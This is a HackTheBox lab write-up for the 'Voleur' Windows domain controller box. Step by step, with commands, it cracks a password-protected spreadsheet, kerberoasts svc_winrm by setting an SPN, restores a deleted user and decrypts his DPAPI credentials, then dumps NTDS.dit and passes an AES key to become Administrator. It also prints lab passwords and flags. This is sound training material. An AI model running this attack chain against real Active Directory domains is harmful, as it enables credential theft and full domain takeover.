---
title: HTB - Voleur
date: 2026-11-04
tags:
  - active-directory
  - kerberoasting
  - writespn
  - dpapi
  - ad-recycle-bin
  - ntds
categories:
  - HackTheBox
os: Windows
difficulty: Medium
description: "HTB Voleur (Medium). An assumed-breach, Kerberos-only AD box: a password-protected Access_Review.xlsx on a share leaks svc_ldap and svc_iis, BloodHound shows svc_ldap has WriteSPN over svc_winrm so I kerberoast it for a WinRM shell, restore a deleted user from the AD Recycle Bin, decrypt his DPAPI credentials for jeremy.combs, SSH in as svc_backup with a leaked key, and dump NTDS.dit to pass-the-key as Administrator."
---

<p style="text-align:center">
  <img src="featured.png" alt="Voleur box" width="250">
</p>

<p>
  <img src="https://img.shields.io/badge/Platform-HackTheBox-9FEF00?style=flat&logo=hackthebox&logoColor=black" alt="Platform">
  <img src="https://img.shields.io/badge/OS-Windows-0078D6?style=flat&logo=windows&logoColor=white" alt="OS">
  <img src="https://img.shields.io/badge/Difficulty-Medium-orange?style=flat" alt="Difficulty">
</p>

> **TL;DR** - An assumed-breach, Kerberos-only box starting with `ryan.naylor:HollowOct31Nyt`. A share holds a password-protected `Access_Review.xlsx`, cracked with John, which leaks cleartext creds for `svc_ldap` and `svc_iis`. BloodHound shows `svc_ldap` has `WriteSPN` over `svc_winrm`, so I add an SPN and kerberoast it, crack the hash, and get a WinRM shell (user.txt). `svc_ldap` is in `restore_users`, so I restore the deleted user `todd.wolfe` from the AD Recycle Bin, decrypt his DPAPI-protected credentials to get `jeremy.combs`, use a leaked SSH key to log in as `svc_backup`, and from there grab `ntds.dit` + `SYSTEM`, dump the hashes, and pass-the-key as `Administrator` for root.txt.

## Recon

As usual I started my recon with nmap. Keep in mind this box gives you some initial credentials, `ryan.naylor:HollowOct31Nyt`.

```bash
nmap -sV -sC -p- 10.129.84.4 -oN nmap/voleur -Pn
```

![](Images/Voleur-nmapscan.png)

This looks like a domain controller, we've got LDAP and Kerberos open. So the first thing I did was validate the initial credentials to see what that user can access. Since NTLM is off here, I go Kerberos all the way with `-k`.

```bash
nxc smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k
```

![](Images/Voleur-nxcvoleur.png)

Then I wanted to enumerate the shares this user has access to.

```bash
nxc smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --shares
```

![](Images/Voleur-shares.png)

Found some interesting shares, so I used the `spider_plus` module to enumerate what's inside them faster and pull everything down.

```bash
nxc smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k -M spider_plus -o DOWNLOAD_FLAG=True
```

![](Images/Voleur-spidernmap.png)

I downloaded the files to my machine to go through them properly, and found an interesting one called `Access_Review.xlsx`, so I opened it.

![](Images/Voleur-openbutpassword.png)

But it's password protected, so I cracked it with John.

```bash
office2john Access_Review.xlsx > hash.txt   # extract the hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt   # crack it
```

![](Images/Voleur-johnthecrack.png)

It cracked to `football1`, so now I can read the file.

![](Images/Voleur-filecontent.png)

The file has some user entries and notes, and even some cleartext passwords for a couple of users in the notes, `svc_ldap:M1XyC9pW7qT5Vn` and `svc_iis:N5pXyW1VqM7CZ8`. I validated both with nxc.

```bash
nxc ldap dc.voleur.htb -u svc_ldap -p M1XyC9pW7qT5Vn -k
nxc ldap dc.voleur.htb -u svc_iis -p N5pXyW1VqM7CZ8 -k
```

![](Images/Voleur-nxcbothvalid.png)

Both valid. Before moving on I ran BloodHound, I've got 3 users and their creds now but I need to understand who they are and what they can do in the AD.

```bash
bloodhound-python -u ryan.naylor -p HollowOct31Nyt -ns 10.129.84.4 -d voleur.htb -c all
```

## BloodHound → kerberoasting via WriteSPN

I ingested the files into the BloodHound GUI and got some interesting results.

![](Images/Voleur-bloodhoundgui.png)

`svc_ldap` has `WriteSPN` over `svc_winrm` (so I can kerberoast that service), and through the `restore_users` group it also has `GenericWrite` over `lacey.miller` and over the Second-Line Support OU (keep that `restore_users` membership in mind, it comes back later). Let's start with `lacey.miller`. The plan with `GenericWrite` is to add an SPN to her account and then kerberoast her, so I used bloodyAD to set the SPN.

```bash
bloodyAD --host dc.voleur.htb -d voleur.htb -u svc_ldap -p 'M1XyC9pW7qT5Vn' -k set object lacey.miller servicePrincipalName -v 'HTTP/fake.voleur.htb'
```

![](Images/Voleur-bloodyAD.png)

And now I can just kerberoast her.

```bash
nxc ldap dc.voleur.htb -u svc_ldap -p M1XyC9pW7qT5Vn --kerberoasting hash.txt -k
```

![](Images/Voleur-kerberoasting.png)

Nice, let's save the hash and try to crack it. And well, that was a rabbit hole, I couldn't crack it. So I went back to BloodHound, and I still have `WriteSPN` over `svc_winrm`, so let's do the exact same thing to that account.

```bash
bloodyAD --host dc.voleur.htb -d voleur.htb -u svc_ldap -p 'M1XyC9pW7qT5Vn' -k set object svc_winrm servicePrincipalName -v 'HTTP/fake2.voleur.htb'
```

![](Images/Voleur-spnsvcwinrm.png)

Then I ran the same kerberoast command as before and got the hashes.

![](Images/Voleur-kerborasting.png)

Cracked it with John, this time for `svc_winrm`.

![](Images/Voleur-hashcatsvcwinrm.png)

Got it, `svc_winrm:AFireInsidedeOzarctica980219afi`. Let's validate it.

![](Images/Voleur-nxcwinrm.png)

The creds are valid, but WinRM here only accepts a Kerberos ticket, so I need to request a TGT for that user first.

```bash
getTGT.py voleur.htb/svc_winrm:'AFireInsidedeOzarctica980219afi' -dc-ip 10.129.84.4
```

![](Images/Voleur-requesttgt.png)

So I requested the TGT, exported it to `KRB5CCNAME`, and logged in with evil-winrm.

```bash
export KRB5CCNAME=svc_winrm.ccache
evil-winrm -i dc.voleur.htb -r voleur.htb
```

![](Images/Voleur-evilwinrlog.png)

And grabbed the user flag:

```
9de8d27b9156b07a333c896e7e4c4da9
```

## Restoring a deleted user (AD Recycle Bin)

Next step. On the Excel I saw that one user was deleted and his password was sitting there in cleartext, and `svc_ldap` belongs to the `restore_users` group, so maybe if I restore that user it gives me something useful. First I checked which user was deleted, I was betting on `todd.wolfe` since we already saw him in the Excel.

```bash
bloodyAD --host dc.voleur.htb -d voleur.htb -u svc_ldap -p 'M1XyC9pW7qT5Vn' -k get children --target 'CN=Deleted Objects,DC=voleur,DC=htb'
```

![](Images/Voleur-deleteduser.png)

Confirmed, `todd.wolfe` is the deleted user. Let's get him back. For this I requested a TGT for `svc_ldap` and then used bloodyAD to restore the account.

```bash
getTGT.py voleur.htb/svc_ldap:'M1XyC9pW7qT5Vn' -dc-ip 10.129.84.4
export KRB5CCNAME=svc_ldap.ccache
bloodyAD --host dc.voleur.htb -d voleur.htb -u svc_ldap -p 'M1XyC9pW7qT5Vn' -k set restore 'todd.wolfe'
```

![](Images/Voleur-restored.png)

So we got our guy back, `todd.wolfe:NightT1meP1dg3on14`. Let's validate him.

![](Images/Voleur-userisbacj.png)

And yeah, he's back. Enumerating the shares again with todd, I found he has access to another folder inside the `IT` share, this time called `Second-Line Support`. Inside looks like an archive for users who already left the company, basically everything that was on that user's machine, this time for `todd.wolfe`.

## DPAPI → jeremy.combs

Inside todd's archived profile is his old Windows data, and that's where DPAPI comes in. Windows stores protected secrets (like saved credentials) under the user's AppData, encrypted with a DPAPI master key. That master key is itself encrypted with the user's password (and SID), so if I have todd's password I can decrypt the master key, and then use it to decrypt the credential blob. Let's see if the theory holds.

I found the master key, so I used dpapi.py to decrypt it with todd's password and SID.

```bash
dpapi.py masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password 'NightT1meP1dg3on14'
```

![](Images/Voleur-dpapidicy.png)

Then I used that decrypted key to decrypt the protected credential file.

```bash
dpapi.py credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

![](Images/Voleur-decrypted.png)

And this file revealed creds for another user, `jeremy.combs:qT3V9pLXyN7W4m`. Let's test it.

![](Images/Voleur-nxcheremy.png)

Valid, so back to BloodHound I marked this user as owned to see the next step. This guy is from third-line support, so maybe he's got a folder on the SMB share too, and yeah he does. Inside were 2 files, an `id_rsa` (probably to SSH on port 2222) and a `Note.txt`.

![](Images/Voleur-smbsharethirdline.png)

## SSH as svc_backup → NTDS dump

The note just points us to SSH, and it mentions `svc_backup`, so let's log in as that user with the key on port 2222.

![](Images/Voleur-loggedinssh.png)

Got it. Now, a backup service account? That smells like NTDS.dit or something along those lines, so let's check. I did a quick search for the files on the system and transferred them to my machine.

![](Images/Voleur-transfer.png)

Then with secretsdump.py I dumped all the hashes.

```bash
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

![](Images/Voleur-dumphashes.png)

Got it. Now I can just request a ticket for the Administrator with his AES key (pass-the-key).

```bash
getTGT.py voleur.htb/Administrator -aesKey f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb
```

And then get a session and the root flag.

![](Images/Voleur-rootflag.png)

Root flag:

```
4adaf757d6eff2fca6620789ba6320dc
```

## Kill chain summary

| Phase | Vector | Result |
|---|---|---|
| Recon | assumed breach `ryan.naylor`, SMB spider | `Access_Review.xlsx` (cracked: `football1`) |
| Foothold | cleartext creds in the xlsx notes | `svc_ldap` + `svc_iis` |
| User | `WriteSPN` over `svc_winrm` → kerberoast + TGT | WinRM shell (user.txt) |
| Lateral | `restore_users` → restore `todd.wolfe` from Recycle Bin | todd's archived profile |
| Lateral | DPAPI master key + credential decrypt | `jeremy.combs` → SSH key → `svc_backup` |
| Root | grab `ntds.dit` + `SYSTEM`, secretsdump, pass-the-key | `Administrator` (root.txt) |
